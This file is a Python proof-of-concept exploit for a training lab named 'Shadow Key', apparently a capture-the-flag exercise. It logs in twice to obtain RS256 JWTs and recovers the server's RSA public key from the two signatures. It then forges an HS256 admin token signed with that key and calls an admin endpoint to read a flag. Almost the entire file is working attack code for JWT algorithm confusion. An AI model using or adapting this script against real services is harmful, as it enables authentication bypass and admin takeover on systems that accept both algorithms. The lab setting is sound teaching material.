#!/usr/bin/env python3
"""
Lab #8 - Shadow Key
Vulnerability : RS256/HS256 confusion, RSA public key not exposed
Attack        : derive RSA public key from two token signatures, forge HS256 token
"""
import argparse, base64, hashlib, hmac, json, sys
from math import gcd
import requests
import gmpy2
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from pwn import log


def parse_args():
    p = argparse.ArgumentParser(description='Lab #8 - Shadow Key PoC')
    p.add_argument('--url', default='http://localhost:3000', metavar='URL',
                   help='target base URL (default: http://localhost:3000)')
    return p.parse_args()


def b64url_enc(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))


def pkcs1_sha256_encode(msg: bytes, key_bits: int = 2048) -> gmpy2.mpz:
    digest     = hashlib.sha256(msg).digest()
    der_prefix = bytes.fromhex('3031300d060960864801650304020105000420')
    em_len     = key_bits // 8
    pad_len    = em_len - len(der_prefix) - len(digest) - 3
    em         = b'\x00\x01' + b'\xff' * pad_len + b'\x00' + der_prefix + digest
    return gmpy2.mpz(int.from_bytes(em, 'big'))


def derive_rsa_n(jwt1: str, jwt2: str) -> int:
    """Derive RSA modulus n from two RS256 tokens (sig2n algorithm)."""
    e = 65537
    vals = []
    for token in [jwt1, jwt2]:
        h, p, s = token.split('.')
        msg     = f'{h}.{p}'.encode()
        sig_int = gmpy2.mpz(int.from_bytes(b64url_dec(s), 'big'))
        em_int  = pkcs1_sha256_encode(msg)
        vals.append(pow(sig_int, e) - em_int)

    n = int(gmpy2.gcd(vals[0], vals[1]))
    for prime in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]:
        while n % prime == 0:
            n //= prime
    return n


def forge_hs256(payload: dict, secret: bytes) -> str:
    h   = b64url_enc(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')).encode())
    p   = b64url_enc(json.dumps(payload, separators=(',', ':')).encode())
    sig = b64url_enc(hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest())
    return f'{h}.{p}.{sig}'


def main():
    args = parse_args()
    base_url = args.url.rstrip('/')

    log.info(f'Target: {base_url}')

    log.info('Collecting two RS256 tokens...')
    tokens = []
    for _ in range(2):
        r = requests.post(f'{base_url}/api/login', json={'username': 'alice'}, timeout=5)
        r.raise_for_status()
        tokens.append(r.cookies['session'])
    log.success(f'Token 1: {tokens[0][:60]}...')
    log.success(f'Token 2: {tokens[1][:60]}...')

    deriving = log.progress('Deriving RSA public key (sig2n)')
    deriving.status('computing pow(sig, 65537) via gmpy2...')
    n = derive_rsa_n(tokens[0], tokens[1])
    if n.bit_length() < 1024 or n.bit_length() > 4096:
        deriving.failure(f'unexpected modulus size: {n.bit_length()} bits - tokens may be identical')
        sys.exit(1)
    deriving.success(f'{n.bit_length()}-bit modulus recovered')

    pub = RSAPublicNumbers(e=65537, n=n).public_key()
    pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
    log.info(f'Public key ({n.bit_length()} bits):\n{pem.decode().strip()}')

    forged = forge_hs256({'name': 'hacker', 'role': 'admin'}, pem)
    log.info(f'Forged HS256 token: {forged[:72]}...')

    r = requests.get(f'{base_url}/api/admin/users', cookies={'session': forged}, timeout=5)
    if r.status_code != 200:
        log.failure(f'Status {r.status_code}: {r.text}')
        sys.exit(1)

    log.success(f'FLAG: {r.json()["flag"]}')


if __name__ == '__main__':
    main()
